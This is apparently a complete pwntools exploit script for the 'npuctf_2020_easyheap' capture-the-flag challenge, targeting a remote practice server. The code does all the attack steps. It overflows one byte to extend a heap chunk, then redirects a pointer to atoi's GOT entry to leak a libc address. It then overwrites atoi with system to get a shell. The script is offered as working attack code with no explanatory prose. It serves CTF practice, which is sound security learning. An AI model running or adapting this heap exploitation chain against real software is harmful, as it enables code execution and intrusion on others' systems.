#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: 2020.11.15 20.20.51
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

#context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./npuctf_2020_easyheap')
libc = ELF('./libc-2.27.so')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

def add(size,cont):
	sh.sendlineafter('Your choice :','1')
	sh.sendlineafter('Size of Heap(0x10 or 0x20 only) : ',str(size))
	sh.sendlineafter('Content:',str(cont))

def edit(index,cont):
	sh.sendlineafter('Your choice :','2')
	sh.sendlineafter('Index :',str(index))
	sh.sendafter('Content: ',str(cont))

def delete(index):
	sh.sendlineafter('Your choice :','4')
	sh.sendlineafter('Index :',str(index))

def show(index):
	sh.sendlineafter('Your choice :','3')
	sh.sendlineafter('Index :',str(index))

def show_addr(name,addr):
	log.success('The '+str(name)+' Addr:' + str(hex(addr)))

sh = process('./npuctf_2020_easyheap')
sh = remote('node3.buuoj.cn',27634)

#extending
add(0x18,'A'*8)
add(0x18,'B'*8)
edit(0,'A'*0x18+'\x41')
delete(1)

#leaking
add(0x38,'A'*8) #1
payload = 'A'*0x10 + p64(0) + p64(0x21)
payload += p64(0x38) + p64(elf.got['atoi'])
edit(1,payload)

show(1)
sh.recvuntil('Content : ')
libc_addr = u64(sh.recv(6).ljust(8,'\x00')) - libc.sym['atoi']
system_addr = libc_addr + libc.sym['system']
show_addr('libc_addr',libc_addr)
show_addr('system_addr',system_addr)

#hijacking
edit(1,p64(system_addr))
#gdb.attach(sh,'b*0x400E6D')

sh.interactive()
